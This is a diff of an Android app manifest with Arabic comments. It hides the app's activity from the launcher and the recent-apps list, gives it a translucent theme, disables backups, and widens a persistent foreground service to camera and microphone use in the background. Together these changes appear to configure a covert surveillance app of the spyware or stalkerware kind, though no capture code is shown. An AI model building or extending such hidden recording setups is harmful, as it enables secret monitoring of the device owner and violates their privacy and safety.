@@ -56,7 +56,7 @@
          التطبيق
     ============================================================ -->
     <application
-        android:allowBackup="true"
+        android:allowBackup="false"
         android:allowClearUserData="true"
         android:hardwareAccelerated="true"
         android:icon="@drawable/ic_launcher"
@@ -95,6 +95,7 @@
              - exported="false" يمنع الوصول من خارج التطبيق
              - بدون intent-filter للـ LAUNCHER، لا يظهر في درج التطبيقات
              - ✅ تم تغيير الثيم إلى Theme.Translucent.NoTitleBar (ثيم نظامي مضمون الوجود)
+             - ✅ إضافة excludeFromRecents لمنع ظهوره في قائمة التطبيقات الحديثة
         ============================================================ -->
         <activity
             android:name=".MainActivity"
@@ -102,14 +103,17 @@
             android:exported="false"
             android:launchMode="singleTop"
             android:screenOrientation="portrait"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true" />
 
         <!-- ============================================================
              ✅ الخدمة الأمامية (Foreground Service)
+             - تم تحديد foregroundServiceType لتشمل dataSync و camera و microphone
+               لأن الخدمة تستخدم هذه الميزات في الخلفية
         ============================================================ -->
         <service
             android:name=".ForegroundService"
-            android:foregroundServiceType="dataSync"
+            android:foregroundServiceType="dataSync|camera|microphone"
             android:exported="false"
             android:enabled="true"
             android:stopWithTask="false" />
